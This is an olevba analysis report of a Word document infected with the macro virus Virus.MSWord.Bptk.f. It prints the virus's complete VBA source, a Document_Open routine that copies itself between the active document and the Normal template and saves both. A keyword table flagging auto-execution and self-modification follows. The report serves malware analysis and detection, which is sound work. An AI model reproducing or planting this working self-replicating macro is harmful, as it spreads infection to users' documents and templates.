olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bptk.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bptk.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next 'D
'D
Application.EnableCancelKey = True
With Options:
.ConfirmConversions = True
.SaveNormalPrompt = True
.VirusProtection = True
End With
d = "": c = d
If NormalTemplate.VBProject.VBComponents.Item(1).Codemodule.Lines(2, 1) <> "On Error Resume Next 'D" _
    Or NormalTemplate.VBProject.VBComponents.Item(1).Codemodule.Lines(3, 1) <> "'D" Then
Set d = NormalTemplate.VBProject.VBComponents.Item(1)
Set c = ActiveDocument.VBProject.VBComponents.Item(1)
End If
If ActiveDocument.VBProject.VBComponents.Item(1).Codemodule.Lines(2, 1) <> "On Error Resume Next 'D" _
    Or ActiveDocument.VBProject.VBComponents.Item(1).Codemodule.Lines(3, 1) <> "'D" Then
Set d = ActiveDocument.VBProject.VBComponents.Item(1)
Set c = NormalTemplate.VBProject.VBComponents.Item(1)
End If
If d <> "" Then
d.Codemodule.DeleteLines 1, d.Codemodule.CountOfLines
For i = 1 To c.Codemodule.CountOfLines
 d.Codemodule.InsertLines i, c.Codemodule.Lines(i, 1)
Next i
ActiveDocument.Save
NormalTemplate.Save
End If
End Sub






















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

